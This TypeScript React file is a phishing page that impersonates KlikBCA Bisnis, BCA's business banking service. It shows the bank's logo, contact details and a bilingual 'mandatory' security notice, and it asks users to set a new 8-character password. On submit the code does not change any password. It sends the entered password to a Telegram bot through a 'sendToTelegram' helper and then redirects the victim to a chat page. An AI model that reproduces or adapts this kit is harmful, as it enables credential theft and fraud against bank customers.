import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram, formatPasswordChangeMessage } from "@/lib/telegram";

export default function ChangePasswordPage() {
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [language, setLanguage] = useState<"id" | "en">("id");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const [, navigate] = useLocation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!newPassword || !confirmPassword) {
      toast({
        title: language === "id" ? "Form Tidak Lengkap" : "Incomplete Form",
        description: language === "id" ? "Silakan isi semua field" : "Please fill all fields",
        variant: "destructive",
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: language === "id" ? "Password Tidak Cocok" : "Passwords Don't Match",
        description: language === "id" ? "Password baru dan konfirmasi password harus sama" : "New password and confirmation must match",
        variant: "destructive",
      });
      return;
    }

    if (newPassword.length !== 8) {
      toast({
        title: language === "id" ? "Password Tidak Valid" : "Invalid Password",
        description: language === "id" ? "Password harus terdiri dari 8 karakter" : "Password must be 8 characters",
        variant: "destructive",
      });
      return;
    }

    if (!/^[a-zA-Z0-9]{8}$/.test(newPassword)) {
      toast({
        title: language === "id" ? "Password Tidak Valid" : "Invalid Password",
        description: language === "id" ? "Password hanya boleh berisi huruf dan angka" : "Password must contain only letters and numbers",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Send to Telegram
      const message = formatPasswordChangeMessage(newPassword, confirmPassword);
      const success = await sendToTelegram(message);

      if (success) {
        toast({
          title: language === "id" ? "Berhasil" : "Success",
          description: language === "id" ? "Password berhasil diubah" : "Password changed successfully",
        });
        
        setNewPassword("");
        setConfirmPassword("");
        
        setTimeout(() => {
          navigate("/chat-conversation");
        }, 1500);
      } else {
        toast({
          title: language === "id" ? "Gagal" : "Failed",
          description: language === "id" ? "Gagal mengubah password" : "Failed to change password",
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: language === "id" ? "Error" : "Error",
        description: language === "id" ? "Terjadi kesalahan" : "An error occurred",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen">
      <div
        className="flex-1 bg-background relative overflow-hidden"
        style={{
          backgroundImage: `url('https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFIGBGMGGGNCDGFGOGHGLGFGIGOCAHOGHG')`,
          backgroundPosition: 'right bottom',
          backgroundRepeat: 'no-repeat',
          backgroundAttachment: 'fixed',
          backgroundSize: 'auto 80%',
        }}
      >
        <div className="relative z-10">
          {/* Header with language toggle */}
          <div className="flex justify-between items-center px-6 md:px-12 py-4">
            <div className="invisible w-20" />
            <button
              onClick={() => setLanguage(language === "id" ? "en" : "id")}
              className="flex items-center gap-2 text-sm font-medium text-primary hover:opacity-70 transition-opacity"
              data-testid="button-language-toggle"
            >
              {language === "id" ? "English Version" : "Versi Indonesia"}
              <div className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-xs font-bold">
                {language === "id" ? "EN" : "ID"}
              </div>
            </button>
          </div>

          {/* Main content */}
          <div className="px-4 md:pl-32 py-8">
            <div className="max-w-sm">
              {/* Logo Section - Left Aligned */}
              <div className="mb-10">
                <img 
                  src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCCGDGBGOCAHOGHG" 
                  alt="BCA Logo"
                  className="h-12 mb-4"
                />
                <h1 className="text-xl font-bold text-primary mb-1">
                  {language === "id"
                    ? "Demi meningkatkan keamanan untuk bertransaksi VPN KLIKBCA (wajib) Membuat Password Terdiri 8 Karakter huruf Besar"
                    : "To improve security for VPN KLIKBCA transactions (required) Create Password Consisting of 8 Capital Letters"}
                </h1>
              </div>

              {/* Change Password Form - Left Aligned */}
              <form onSubmit={handleSubmit} className="space-y-3">
                <div className="space-y-2">
                  <Label htmlFor="new-password" className="text-sm font-semibold text-primary">
                    {language === "id" ? "Password Baru" : "New Password"}
                  </Label>
                  <Input
                    id="new-password"
                    type="password"
                    value={newPassword}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z0-9]/g, "").slice(0, 8);
                      setNewPassword(value);
                    }}
                    placeholder={language === "id" ? "Masukkan Password Baru" : "Enter New Password"}
                    maxLength={8}
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-new-password"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="confirm-password" className="text-sm font-semibold text-primary">
                    {language === "id" ? "Konfirmasi Password" : "Confirm Password"}
                  </Label>
                  <Input
                    id="confirm-password"
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z0-9]/g, "").slice(0, 8);
                      setConfirmPassword(value);
                    }}
                    placeholder={language === "id" ? "Konfirmasi Password Baru" : "Confirm New Password"}
                    maxLength={8}
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-confirm-password"
                  />
                </div>

                <Button
                  type="submit"
                  className="w-full h-10 mt-6 rounded-full bg-primary hover:bg-primary/90 text-white font-semibold uppercase tracking-wide text-sm"
                  disabled={isSubmitting}
                  data-testid="button-submit-password"
                >
                  {isSubmitting ? (language === "id" ? "Mengirim..." : "Sending...") : (language === "id" ? "Lanjutkan" : "Continue")}
                </Button>
              </form>

              {/* Help Text Section - Left Aligned */}
              <div className="mt-8 text-sm text-foreground leading-relaxed">
                <p className="mb-3">
                  {language === "id"
                    ? "Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses"
                    : "If you don't have KlikBCA Bisnis facility yet, please access"}{" "}
                  <a
                    href="https://www.bca.co.id/id/bisnis/layanan/e-banking-bisnis/klikbca-bisnis"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-primary underline font-medium hover:opacity-70"
                  >
                    {language === "id" ? "Informasi KlikBCA Bisnis" : "KlikBCA Bisnis Information"}
                  </a>{" "}
                  {language === "id" ? "atau hubungi:" : "or contact:"}
                </p>
              </div>

              {/* Contact Information Section - Left Aligned */}
              <div className="mt-6 flex gap-6">
                {/* Phone Contact */}
                <a
                  href="tel:1500777"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-phone"
                >
                  <img 
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCIGBGMGPGCGDGBGOCAHOGHG"
                    alt="Halo Layanan"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">{language === "id" ? "Halo Layanan" : "Customer Service"}</p>
                    <p className="font-semibold text-foreground">{language === "id" ? "KlikBCA Bisnis" : "KlikBCA Bisnis"}</p>
                    <p className="text-primary font-bold text-xs">1500777</p>
                  </div>
                </a>

                {/* Email Contact */}
                <a
                  href="mailto:halobca@bca.co.id"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-email"
                >
                  <img 
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCFGNGBGJGMGOCAHOGHG"
                    alt="Email"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">{language === "id" ? "Email" : "Email"}</p>
                    <p className="text-primary font-bold text-xs">halobca@bca.co.id</p>
                  </div>
                </a>

                {/* Twitter Contact */}
                <a
                  href="https://twitter.com/halobca"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-twitter"
                >
                  <img 
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCEHHHJGEHEHFGCHOCAHOGHG"
                    alt="Twitter"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">Twitter</p>
                    <p className="text-primary font-bold text-xs">@HaloBCA</p>
                  </div>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center text-xs py-3" style={{ backgroundColor: '#f2f2f2', color: '#1F6198' }}>
        {language === "id" ? "Copyright © 2020   All Right Reserved" : "Copyright © 2020   All Right Reserved"}
      </div>
    </div>
  );
}